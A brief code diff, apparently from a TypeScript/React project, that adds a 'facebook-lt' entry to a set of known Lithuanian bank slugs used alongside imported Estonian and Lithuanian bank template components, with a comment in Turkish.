@@ -43,7 +43,7 @@ import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate"
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
 // LT bilinen banka slug'lari (methodMap ile ayni, kopya):
 const LITHUANIA_KNOWN_SLUGS = new Set([
-  "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt"
+  "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt","facebook-lt"
 ]);
 
 type Props = {
